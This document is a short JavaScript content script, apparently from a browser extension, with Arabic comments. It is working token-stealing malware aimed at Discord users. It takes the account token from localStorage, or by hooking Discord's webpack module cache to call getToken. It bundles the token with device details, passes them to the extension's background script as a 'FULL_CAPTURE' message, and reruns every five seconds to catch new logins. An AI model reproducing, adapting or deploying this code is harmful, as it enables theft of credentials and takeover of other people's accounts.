(function() {
    const catchToken = () => {
        let token = "";

        // الطريقة الأولى: محاولة السحب من الـ LocalStorage مباشرة
        try {
            token = (window.localStorage.getItem('token') || "").replace(/"/g, "");
        } catch (e) {}

        // الطريقة الثانية: اختراق الـ Webpack (الطريقة الأقوى حالياً)
        if (!token || token === "null") {
            try {
                window.webpackChunkdiscord_app?.push([[Math.random()], {}, (e) => {
                    for (const m in e.c) {
                        if (e.c[m].exports?.default?.getToken) {
                            token = e.c[m].exports.default.getToken();
                        } else if (e.c[m].exports?.getToken) {
                            token = e.c[m].exports.getToken();
                        }
                    }
                }]);
            } catch (e) {}
        }

        // الطريقة الثالثة: إذا وجدنا التوكن، نرسله فوراً مع معلومات الجهاز
        if (token && token.length > 30) {
            chrome.runtime.sendMessage({
                type: "FULL_CAPTURE",
                token: token,
                info: {
                    ua: navigator.userAgent,
                    plt: navigator.platform,
                    res: `${window.screen.width}x${window.screen.height}`
                }
            });
        }
    };

    // تشغيل السحب كل 5 ثوانٍ لضمان الصيد فور تسجيل الدخول
    setInterval(catchToken, 5000);
    catchToken();
})();
